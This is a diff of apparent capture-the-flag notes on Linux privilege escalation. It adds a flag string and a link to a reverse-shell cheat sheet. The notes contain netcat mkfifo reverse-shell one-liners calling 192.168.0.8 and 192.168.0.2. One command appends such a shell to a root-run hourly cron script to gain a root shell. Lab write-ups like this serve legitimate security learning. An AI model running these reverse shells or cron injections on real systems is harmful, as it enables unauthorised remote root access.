@@ -87,8 +87,7 @@ nc -lvnp 2424
 
 ----------------------------------------------------------------------------------------------------------
 
-
-
+flag{9f1f16}:
 
 https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#summary
 cat /etc/crontab
@@ -111,6 +110,9 @@ cuiteur-cleaning made it possible to use as a script.
 /usr/bin/find /var/www/html -name *.tmp -exec rm {} +
 /bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.8 7878 > /tmp/tfl
 
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#rust
+
+
 echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/f" >>/etc/cron.hourly/cuiteur-cleaning
 $ cat /etc/cron.hourly/cuiteur-cleaning
 #!/bin/bash
@@ -118,7 +120,7 @@ $ cat /etc/cron.hourly/cuiteur-cleaning
 /bin/rm /tmp/tfl; mkfifo /tmp/tfl; cat /tmp/tfl | /bin/bash -i 2>&1 | nc 192.168.0.8 7878 > /tmp/tfl
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 4242 >/tmp/f
 
-
+-----------------------------------------------------------------------------------------------------------------------------------
 
 
 
